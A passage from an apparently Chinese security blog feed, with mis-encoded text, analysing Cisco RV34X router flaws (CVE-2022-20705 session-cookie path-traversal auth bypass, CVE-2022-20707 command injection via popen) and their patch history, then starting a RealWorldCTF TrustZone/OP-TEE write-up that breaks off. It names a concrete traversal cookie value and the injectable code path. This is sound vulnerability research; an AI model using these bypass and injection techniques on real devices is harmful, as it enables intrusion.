class="line">proxy_buffering off;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">uwsgi_read_timeout 3600;</span><br><span class="line">uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;upload &#123;</span><br><span class="line">set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny &#x3D; &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">upload_pass &#x2F;form-file-upload;</span><br><span class="line">upload_store &#x2F;tmp&#x2F;upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup 400 404 499 500-505;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ï¼Œ è¿™é‡Œæ˜¯åˆ¤æ–­å¦‚æœ <code>/tmp/websession/token/$cookie_sessionid</code> æ–‡ä»¶å­˜åœ¨,åˆ™è¿”å›ã€‚  æ³¨æ„è¿™é‡Œçš„ <code>$cookie_sessionid</code> æ˜¯ç”±ç”¨æˆ·åœ¨ HTTP è¯·æ±‚ä¸­ä¼ å…¥çš„ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æ–‡ä»¶æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å­˜åœ¨ <code>../../</code>  ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬è·¨ç›®å½•æŒ‡å‘ä¸€ä¸ªå­˜åœ¨çš„æ–‡ä»¶å°±å¯èƒ½é€ æˆæˆæƒç»•è¿‡ã€‚åƒè¿™é‡Œä½œè€…ä½¿ç”¨çš„æ˜¯  <code>../../../etc/firmware_version</code>ã€‚ </p><p>è™½ç„¶åœ¨ <code>upload.cgi</code> å¯¹ HTTP_COOKIE è¿›è¡Œäº†æ­£åˆ™æ ¡éªŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v16 = strcmp_1(REQUEST_URI, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (v16 != <span class="number">0</span>) &#123;</span><br><span class="line">    v17 = strcmp_1(REQUEST_URI, <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (v17 == <span class="number">0</span> &amp;&amp; HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if the URI is /upload and we have a sessionid in the cookie</span></span><br><span class="line">        v18 = strlen_1(HTTP_COOKIE);</span><br><span class="line">        <span class="keyword">if</span> (v18 &lt; <span class="number">81</span>) &#123; <span class="comment">// sanity check sessionid characters</span></span><br><span class="line">            v19 = match_regex(<span class="string">&quot;^[A-Za-z0-9+=/]*$&quot;</span>, HTTP_COOKIE);</span><br><span class="line">            <span class="keyword">if</span> (v19 == <span class="number">0</span>) &#123;</span><br><span class="line">                v20 = StrBufToStr(local_0x44);</span><br><span class="line">                func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨ç¨‹åºæ²¡æœ‰è€ƒè™‘ç”¨æˆ·åœ¨  HTTP cookie ä¸­ä¼ å…¥å¤šä¸ª session_id çš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if an cookie is available</span></span><br><span class="line">    StrBufSetStr(cookie_str, HTTP_COOKIE);</span><br><span class="line">    __s2 = StrBufToStr(cookie_str);</span><br><span class="line">    next_semicolon = strtok_r(__s2, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// start to split the semicolon deliminated cookie</span></span><br><span class="line">    HTTP_COOKIE = <span class="number">0</span>; <span class="comment">// this variable will become the sessionid string</span></span><br><span class="line">    <span class="keyword">while</span> (next_semicolon != <span class="number">0</span>) &#123;</span><br><span class="line">        sessionid = <span class="built_in">strstr</span>(next_semicolon, <span class="string">&quot;sessionid=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sessionid != <span class="number">0</span>) &#123; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">            HTTP_COOKIE = sessionid + <span class="number">10</span>; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        next_semicolon = strtok_r(<span class="number">0</span>, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// keep searching</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœè®¾ç½®ä¸¤ä¸ª seesionid ï¼Œ ç¬¬ä¸€ä¸ªä¸º <code>../../../etc/frimware_version</code> ï¼Œ ç¬¬äºŒä¸ªä¸ºå¯ä»¥é€šè¿‡æ­£åˆ™çš„æœ‰æ•ˆå­—ç¬¦ã€‚</p><p>æœ€åæˆ‘ä»¬å°±å¯ä»¥ç”¨æˆæƒçš„çŠ¶æ€è®¿é—® <code>upload.cgi</code> äº†ã€‚</p><h2 id="CVE-2022-20707-Command-Injection"><a href="#CVE-2022-20707-Command-Injection" class="headerlink" title="CVE-2022-20707 Command Injection"></a>CVE-2022-20707 Command Injection</h2><p>ä½œè€…åœ¨ <code>upload.cgi</code> é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ³¨å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (json_obj != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">json_str = json_object_to_json_string(json_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;buff, <span class="string">&quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;</span>, v3, sessionid, json_str);</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&quot;curl_cmd=%s&quot;</span>, &amp;buff);</span><br><span class="line"></span><br><span class="line">__stream = popen(&amp;buff, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__stream != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">fread_1(&amp;buff[<span class="number">2048</span>], <span class="number">2048</span>, <span class="number">1</span>, __stream);</span><br><span class="line"></span><br><span class="line">fclose_1(__stream);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„çš„ json_str æ²¡æœ‰æ ¡éªŒï¼Œ ä¼šé€ æˆå‘½ä»¤æ³¨å…¥ã€‚</p><h2 id="Related-vulnerability-tracking"><a href="#Related-vulnerability-tracking" class="headerlink" title="Related vulnerability tracking"></a>Related vulnerability tracking</h2><p>æˆ‘ä»¬ä¹‹å‰åˆ†æäº† CVE-2022-20699-cisco-RV34X çš„æ—¶å€™ï¼Œæ³¨æ„åˆ°ä¸€ä¸ªè¡¥ä¸ï¼Œ ä¿®è¡¥äº† Nginx çš„é…ç½®ä¸å½“çš„æ¼æ´ã€‚ç„¶åä»Šå¤©å’Œ @leommxj ä¸€èµ·è¿½æº¯äº†ä¸€ä¸‹ cisco çš„ä¿®è¡¥å†å²ã€‚</p><h3 id="Firmware-version-1-0-03-19"><a href="#Firmware-version-1-0-03-19" class="headerlink" title="Firmware version 1.0.03.19"></a>Firmware version 1.0.03.19</h3><p>nginx å¯¹è°ƒç”¨ upload.cgi æ²¡æœ‰ä»»ä½•çš„æ ¡éªŒï¼Œ å› æ­¤å¯ä»¥è®¿é—® upload.cgi ï¼Œ è¿˜å‡ºä¸¤ä¸ªæ¼æ´ #CVE-2020-3451 #CVE-2020-3453</p><p>ç›¸å…³çš„æ¼æ´ä¿¡æ¯ä¸º:</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1100/">ZDI-20-1100 | Zero Day Initiative</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1101/">ZDI-20-1101 | Zero Day Initiative</a><br><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-osinj-rce-pwTkPCJv">Cisco Small Business RV340 Series Routers Command Injection and Remote Code Execution Vulnerabilities</a></p><h3 id="Firmware-version-1-0-03-21"><a href="#Firmware-version-1-0-03-21" class="headerlink" title="Firmware version 1.0.03.21"></a>Firmware version 1.0.03.21</h3><p>ä¹‹åæœ‰ä¸ªè€å“¥å‘ç° cisco è™½ç„¶åŠ è¡Œäº†æˆæƒæ ¡éªŒï¼Œä½†æ˜¯åŠ å¾—ä¸è¡Œã€‚</p><p>è¿™åŠ ä¹‹å‰å’ŒåŠ ä¹‹åçš„ diffï¼š<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png"></a></p><p>è¿™ä¸ªä¿®å¤æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ã€‚é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œä»»ä½•éç©ºçš„æˆæƒæ ‡å¤´éƒ½ä¼šå°† $deny è®¾ç½®ä¸ºâ€œ0â€ã€‚å› æ­¤ï¼Œä»å­—é¢ä¸Šå‘é€ä»»ä½•çœ‹èµ·æ¥æœ‰æ•ˆçš„æˆæƒæ ‡å¤´ä½œä¸ºè¯·æ±‚/ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å°†ç»•è¿‡æˆæƒæ£€æŸ¥ã€‚</p><p>ç›¸å…³æ¼æ´ä¿¡æ¯ä¸ºï¼š </p><p>#CVE-2021-1473 #CVE-2021-1472<br><a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/">Advisory: Cisco RV34X Series - Authentication Bypass and Remote Command Execution - IoT Inspector (iot-inspector.com)</a></p><h3 id="Firmware-version-1-0-03-22"><a href="#Firmware-version-1-0-03-22" class="headerlink" title="Firmware version 1.0.03.22"></a>Firmware version 1.0.03.22</h3><p>ç„¶åè¿™ä¸ªç‰ˆæœ¬ä¹‹åå»æ‰äº†ä¸Šå›¾ 13 è¡Œçš„ nginx é…ç½®ã€‚ä½†æ˜¯å‡ºç°äº†æ­¤æ¬¡ <a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> è¿™ä¸ªæ¼æ´äº†ã€‚</p><h3 id="Firmware-version-1-0-0-3-26"><a href="#Firmware-version-1-0-0-3-26" class="headerlink" title="Firmware version 1.0.0.3.26"></a>Firmware version 1.0.0.3.26</h3><p>æœ€æ–°ç‰ˆæœ¬çš„ nginx ç°åœ¨é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;upload &#123;</span><br><span class="line">    set $deny 0;</span><br><span class="line"></span><br><span class="line">    if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($cookie_sessionid ~* &quot;^[a-f0-9]&#123;64&#125;&quot;) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($deny !&#x3D; &quot;012&quot;) &#123;</span><br><span class="line">            return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¢åŠ äº†ä¸€ä¸ªæ­£åˆ™åˆ¤æ–­ã€‚</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>ä¸€ä¸ªç‚¹æœ‰æ„æ€çš„æ˜¯ï¼Œ è¿™<a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> ä½œè€… å’Œ <a href="#Firmware-version-1-0-03-21">CVE-2021-1473</a> ä½œè€…ç”¨åˆ°çš„å‘½ä»¤æ³¨å…¥å’Œæˆ‘å½“æ—¶æŒ–åˆ°<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv340-cmdinj-rcedos-pY8J3qfy">ä¸¤ä¸ªç¼–å·</a> #CVE-2021-1609 å’Œ #CVE-2021-1610  çš„æ¼æ´ç‚¹åœ¨ä¸€è¡Œä»£ç é‡Œï¼Œè¿™æ„æ€å°±æ˜¯è¿™è¡Œä»£ç ä¸€å…±å‡ºäº† 4 ä¸ªæ¼æ´ç¼–å·</p><p>ä»¥åæŒ– IoT æ¼æ´ä¹Ÿè¦å¤šæ³¨æ„ä¸€ä¸‹ web ç›¸å…³çš„é…ç½®äº†ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2022-20705 </tag>
            
            <tag> CVE-2022-20707 </tag>
            
            <tag> cisco </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RWCTF-4th TrustZone challenge Writeup</title>
      <link href="RWCTF-4th-TrustZone-challenge-Writeup.html"/>
      <url>RWCTF-4th-TrustZone-challenge-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>ç¬¬å››å±Š realworldctf æˆ‘å’Œ @chennan å‡ºäº†ä¸‰ä¸ªé¢˜ç›®ï¼Œåˆ†åˆ«æ˜¯  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>ï¼Œ å…¶ä¸­   <code>Trust or Not</code>, <code>UnTrustZone</code>  æ˜¯å’Œ TrustZone ç›¸å…³çš„é¢˜ç›®ã€‚</p><h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p><p>TrustZoneæ˜¯åŸºäºç¡¬ä»¶çš„å®‰å…¨åŠŸèƒ½ï¼Œå®ƒé€šè¿‡å¯¹åŸæœ‰ç¡¬ä»¶æ¶æ„è¿›è¡Œä¿®æ”¹ï¼Œåœ¨å¤„ç†å™¨å±‚æ¬¡å¼•å…¥äº†ä¸¤ä¸ªä¸åŒæƒé™çš„ä¿æŠ¤åŸŸâ€”â€”å®‰å…¨ä¸–ç•Œå’Œæ™®é€šä¸–ç•Œï¼Œä»»ä½•æ—¶åˆ»å¤„ç†å™¨ä»…åœ¨å…¶ä¸­çš„ä¸€ä¸ªç¯å¢ƒå†…è¿è¡Œã€‚åŒæ—¶è¿™ä¸¤ä¸ªä¸–ç•Œå®Œå…¨æ˜¯ç¡¬ä»¶éš”ç¦»çš„ï¼Œå¹¶å…·æœ‰ä¸åŒçš„æƒé™ï¼Œæ­£å¸¸ä¸–ç•Œä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºæˆ–æ“ä½œç³»ç»Ÿè®¿é—®å®‰å…¨ä¸–ç•Œçš„èµ„æºå—åˆ°ä¸¥æ ¼çš„é™åˆ¶ï¼Œåè¿‡æ¥å®‰å…¨ä¸–ç•Œä¸­è¿è¡Œçš„ç¨‹åºå¯ä»¥æ­£å¸¸è®¿é—®æ­£å¸¸ä¸–ç•Œä¸­çš„èµ„æºã€‚è¿™ç§ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„ç¡¬ä»¶éš”ç¦»å’Œä¸åŒæƒé™ç­‰å±æ€§ä¸ºä¿æŠ¤åº”ç”¨ç¨‹åºçš„ä»£ç å’Œæ•°æ®æä¾›äº†æœ‰æ•ˆçš„æœºåˆ¶ï¼šé€šå¸¸æ­£å¸¸ä¸–ç•Œç”¨äºè¿è¡Œå•†å“æ“ä½œç³»ç»Ÿï¼ˆä¾‹å¦‚Androidã€iOSç­‰ï¼‰ï¼Œè¯¥æ“ä½œç³»ç»Ÿæä¾›äº†æ­£å¸¸æ‰§è¡Œç¯å¢ƒï¼ˆRich Execution Environmentï¼ŒREEï¼‰ï¼›å®‰å…¨ä¸–ç•Œåˆ™å§‹ç»ˆä½¿ç”¨å®‰å…¨çš„å°å†…æ ¸ï¼ˆTEE-kernelï¼‰æä¾›å¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼ˆTrusted Execution Environmentï¼ŒTEEï¼‰ï¼Œæœºå¯†æ•°æ®å¯ä»¥åœ¨TEEä¸­è¢«å­˜å‚¨å’Œè®¿é—®ã€‚</p><h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Trust or Not</p><p>Score: <em>357</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p><p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>è¦è§£å†³è¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆè¦äº†è§£ä»€ä¹ˆæ˜¯å®‰å…¨å­˜å‚¨ã€‚ æ•°æ®è¦ä¹ˆä»¥æŸç§åŠ å¯†/æˆæƒçš„æ–¹å¼å­˜å‚¨åœ¨linuxæ–‡ä»¶ç³»ç»Ÿ<code>/data/tee</code>ä¸­ï¼Œè¦ä¹ˆå­˜å‚¨åœ¨Emmc RPMBï¼ˆReplay Protected Memory Blockï¼‰åˆ†åŒºä¸­ã€‚è¿™æ¬¡çš„ç›¸å…³é¢˜ç›®ä¸»è¦ä½¿ç”¨äº† <code>OP-TEE</code>çš„å¼€æºé¡¹ç›®ï¼Œå…¶æ›´è¯¦ç»†çš„ä¿¡æ¯å¯ä»¥åœ¨<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEEæ–‡æ¡£</a> ä¸­æ‰¾åˆ°ã€‚</p><p> **Hardware Unique Key ï¼ˆHUKï¼‰ ** </p><p>å¤§å¤šæ•°è®¾å¤‡éƒ½æœ‰æŸç§ç¡¬ä»¶å”¯ä¸€å¯†é’¥ï¼ˆHUKï¼‰ï¼Œä¸»è¦ç”¨äºæ´¾ç”Ÿå…¶ä»–å¯†é’¥ã€‚ä¾‹å¦‚ï¼Œå½“æ´¾ç”Ÿå¯†é’¥ç”¨äºå®‰å…¨å­˜å‚¨ç­‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ HUK æ´¾ç”Ÿã€‚HUK çš„é‡è¦ä¹‹å¤„åœ¨äºå®ƒéœ€è¦å¾—åˆ°å¾ˆå¥½çš„ä¿æŠ¤ï¼Œå¹¶ä¸”åœ¨æœ€å¥½çš„æƒ…å†µä¸‹ï¼ŒHUK æ°¸è¿œä¸åº”è¯¥ç›´æ¥ä»è½¯ä»¶è¯»å–ï¼Œç”šè‡³ä¸åº”è¯¥ä»å®‰å…¨æ–¹é¢è¯»å–ã€‚æœ‰ä¸åŒçš„è§£å†³æ–¹æ¡ˆï¼ŒåŠ å¯†åŠ é€Ÿå™¨å¯èƒ½æ”¯æŒå®ƒï¼Œæˆ–è€…ï¼Œå®ƒå¯èƒ½æ¶‰åŠå¦ä¸€ä¸ªå®‰å…¨çš„åå¤„ç†å™¨ã€‚</p><p> <strong>Secure Storage Key ï¼ˆSSKï¼‰</strong> </p><p>SSKæ˜¯æ¯ä¸ªè®¾å¤‡çš„å¯†é’¥ï¼Œåœ¨OP-TEEå¯åŠ¨æ—¶ç”Ÿæˆå¹¶å­˜å‚¨åœ¨å®‰å…¨å†…å­˜ä¸­ã€‚SSKç”¨äºæ´¾ç”ŸTAå­˜å‚¨å¯†é’¥ï¼ˆTSKï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256Â (HUK, Chip ID || â€œstatic stringâ€)</span><br></pre></td></tr></table></figure><p>è·å–ç¡¬ä»¶å”¯ä¸€å¯†é’¥ï¼ˆHUKï¼‰å’ŒèŠ¯ç‰‡IDçš„åŠŸèƒ½å–å†³äºå¹³å°å®ç°ã€‚ç›®å‰ï¼ŒOP-TEE ç³»ç»Ÿä¸­æ¯å°è®¾å¤‡åªæœ‰ä¸€æŠŠ SSKï¼Œç”¨äºå®‰å…¨å­˜å‚¨å­ç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œä¸ºäº†å°†æ¥ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ä¸ºæ¯å°è®¾å¤‡ä½¿ç”¨ç”Ÿæˆ SSK çš„ç›¸åŒç®—æ³•ä¸ºä¸åŒçš„å­ç³»ç»Ÿåˆ›å»ºä¸åŒçš„å¯†é’¥ã€‚ä¸ºä¸åŒå­ç³»ç»Ÿç”Ÿæˆä¸åŒçš„å¯†é’¥çš„ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨ä¸åŒçš„é™æ€ç”Ÿæˆå¯†é’¥çš„å­—ç¬¦ä¸²ã€‚</p><p> <strong>Trusted Application Storage Key ï¼ˆTSKï¼‰</strong>  </p><p>TAå­˜å‚¨å¯†é’¥</p><p>TSKæ˜¯æ¯ä¸ªå—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºå¯†é’¥ï¼Œç”±SSKå’ŒTAçš„æ ‡è¯†ç¬¦ï¼ˆUUIDï¼‰ç”Ÿæˆã€‚å®ƒè¢«ç”¨æ¥ä¿æŠ¤FEKï¼Œæ¢å¥è¯è¯´ï¼Œç”¨æ¥åŠ å¯†/è§£å¯†FEKã€‚</p><p>ä»£ç å®ç°ï¼š<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment"> * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_hmac è¿™é‡Œä½¿ç”¨çš„æ˜¯ HMAC_SHA256</p><p>æœ€åå°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure><p><strong>File Encryption Key ï¼ˆFEKï¼‰</strong> </p><p>å½“ä¸€ä¸ªæ–°çš„TEEæ–‡ä»¶è¢«åˆ›å»ºæ—¶ï¼Œå¯†é’¥ç®¡ç†å™¨å°†é€šè¿‡ PRNGï¼ˆpesudoéšæœºæ•°ç”Ÿæˆå™¨ï¼‰ä¸ºTEEæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ–°çš„ FEKï¼Œå¹¶å°†åŠ å¯†çš„ FEK å­˜å‚¨åœ¨ meta æ–‡ä»¶ä¸­ã€‚FEK ç”¨äºå¯¹å­˜å‚¨åœ¨ meta æ–‡ä»¶ä¸­çš„TEEæ–‡ä»¶ä¿¡æ¯æˆ–å—æ–‡ä»¶ä¸­çš„æ•°æ®è¿›è¡ŒåŠ å¯†/è§£å¯†ã€‚</p><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>é€šè¿‡é€†å‘å’Œæ¯”å¯¹OP-Teeçš„æºä»£ç ï¼Œå¸Œæœ›é€‰æ‰‹èƒ½å‘ç° <code>HUK</code>æ²¡æœ‰è¢«è®¾ç½®ã€‚ç„¶åflagè¢«åŠ å¯†äº†ä¸”å­˜å‚¨åœ¨ <code>/data/tee/2</code> æ–‡ä»¶é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåªè¦åˆ†æä¸‹å®‰å…¨å­˜å‚¨çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒå¦‚å›¾ï¼š</p><p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" 